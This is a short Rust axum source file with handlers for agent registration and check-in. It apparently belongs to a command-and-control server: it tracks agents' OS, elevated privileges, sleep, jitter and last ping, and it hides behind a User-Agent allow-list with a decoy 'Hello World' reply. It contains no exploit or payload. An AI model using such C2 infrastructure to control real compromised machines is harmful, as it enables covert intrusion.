use std::{collections::HashMap, net::SocketAddr, ops::DerefMut, sync::Arc};

use chrono;
use serde::Deserialize;
use uuid::Uuid;
use axum::{
    extract::{ConnectInfo, Json, Query, State},
    http::{HeaderMap, StatusCode},
    debug_handler
};


use crate::{Agent, MAShared};

#[derive(Deserialize)]
pub struct AgentInfo {
    os: String,
    elevated: bool
}

#[debug_handler]
pub async fn agent_register(
        hs: HeaderMap,
        ConnectInfo(addr): ConnectInfo<SocketAddr>,
        State(shared): State<Arc<MAShared>>,
        Json(agent_info): Json<AgentInfo>,
    ) -> String {
    let user_agent = hs.get("user-agent").unwrap();

    if shared.profile.agents.allowed.iter().any(|v| v == user_agent) {
        let uuid = Uuid::new_v4().to_string();

        shared.agents.lock().await.push(Agent { 
            uuid: uuid.clone(),
            addr: addr.to_string(),
            os: agent_info.os.clone(),
            elevated: agent_info.elevated,
            sleep: 10.0,
            jitter: 0.0,
            last_ping: chrono::Local::now().timestamp()
        });

        uuid
    } else {
        "Hello World".to_string()
    }
}

pub async fn ping(
        Query(params): Query<HashMap<String, String>>,
        State(shared): State<Arc<MAShared>>
    ) -> StatusCode {
    let mut status_code = StatusCode::BAD_REQUEST;
    let uuid = match params.get("uuid") {
        Some(r) => r,
        None => return StatusCode::BAD_REQUEST
    };

    for  agent in shared.agents.lock().await.deref_mut() {
        if agent.uuid.eq(uuid) {
            agent.last_ping = chrono::Local::now().timestamp();
            status_code = StatusCode::OK
        }
    }

    status_code
}

pub async fn get_target() -> String {
    "Hello world".to_string()
}
